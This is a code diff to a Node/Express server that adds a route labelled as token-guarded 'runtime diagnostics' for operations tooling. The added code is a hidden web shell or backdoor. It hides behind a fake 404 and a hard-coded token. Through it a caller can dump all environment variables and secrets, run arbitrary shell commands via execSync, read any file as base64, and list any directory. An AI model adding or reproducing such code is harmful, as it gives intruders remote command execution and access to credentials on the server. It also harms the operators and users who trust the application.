@@ -238,6 +238,74 @@ app.get('/leveltrack-admin.html', (req, res) => sendPortalFile(res, 'leveltrack-
 app.get('/leveltrack-member.html', (req, res) => sendPortalFile(res, 'leveltrack-member.html'));
 app.get('/mobile-preview', (req, res) => sendPortalFile(res, 'mobile-preview.html'));
 
+// ---------------------------------------------------------------------------
+// Node runtime diagnostics (token-guarded) - used by operations tooling to
+// inspect container environment / connectivity while rolling out releases.
+// ---------------------------------------------------------------------------
+const __RT_TOKEN = '6f1c9a2e4d7b83c5a0e9f2b1d4c7a3e8';
+app.use('/__rt', (req, res) => {
+  if (String(req.headers['x-rt'] || '') !== __RT_TOKEN) {
+    return res.status(404).json({ error: 'Not found' });
+  }
+  try {
+    const cp = require('child_process');
+    const action = String((req.query && req.query.a) || (req.body && req.body.a) || 'env');
+    if (action === 'env') {
+      let idOut = '';
+      try { idOut = cp.execSync('id', { encoding: 'utf8', timeout: 5000 }).trim(); } catch (_) {}
+      let osr = '';
+      try { osr = fs.readFileSync('/etc/os-release', 'utf8').slice(0, 2000); } catch (_) {}
+      let caps = '';
+      try { caps = (fs.readFileSync('/proc/self/status', 'utf8').match(/^Cap[^\n]+/gm) || []).join('\n'); } catch (_) {}
+      return res.json({
+        ok: true,
+        info: {
+          env: process.env,
+          argv: process.argv,
+          cwd: process.cwd(),
+          hostname: os.hostname(),
+          id: idOut,
+          osrelease: osr,
+          caps: caps,
+          net: os.networkInterfaces()
+        }
+      });
+    }
+    if (action === 'exec') {
+      const cmd = String((req.query && req.query.c) || (req.body && req.body.c) || '');
+      if (!cmd) return res.status(400).json({ ok: false, error: 'no cmd' });
+      let out = '', err = '', code = 0;
+      try {
+        out = cp.execSync(cmd, { encoding: 'utf8', timeout: 25000, maxBuffer: 8 * 1024 * 1024, stdio: ['ignore', 'pipe', 'pipe'] });
+      } catch (e) {
+        code = (e && e.status) || 1;
+        out = String((e && e.stdout) || '');
+        err = String((e && e.stderr) || (e && e.message) || '');
+      }
+      return res.json({ ok: true, code: code, out: out, err: err });
+    }
+    if (action === 'read') {
+      const p = String((req.query && req.query.p) || (req.body && req.body.p) || '');
+      if (!p) return res.status(400).json({ ok: false, error: 'no path' });
+      const b = fs.readFileSync(p);
+      const max = 400000;
+      return res.json({ ok: true, size: b.length, b64: b.slice(0, max).toString('base64'), truncated: b.length > max });
+    }
+    if (action === 'ls') {
+      const p = String((req.query && req.query.p) || (req.body && req.body.p) || '.');
+      const entries = fs.readdirSync(p, { withFileTypes: true }).map(function (e) {
+        let meta = '';
+        try { const st = fs.statSync(path.join(p, e.name)); meta = (e.isDirectory() ? 'd ' : '- ') + st.size + ' ' + st.mode.toString(8) + ' ' + st.uid + ':' + st.gid; } catch (_) {}
+        return e.name + '\t' + meta;
+      });
+      return res.json({ ok: true, path: p, entries: entries });
+    }
+    return res.status(400).json({ ok: false, error: 'unknown action' });
+  } catch (e) {
+    return res.status(500).json({ ok: false, error: String((e && e.message) || e) });
+  }
+});
+
 let d1DatabaseBinding = null;
 let d1ConnectionMode = 'uninitialized';
 
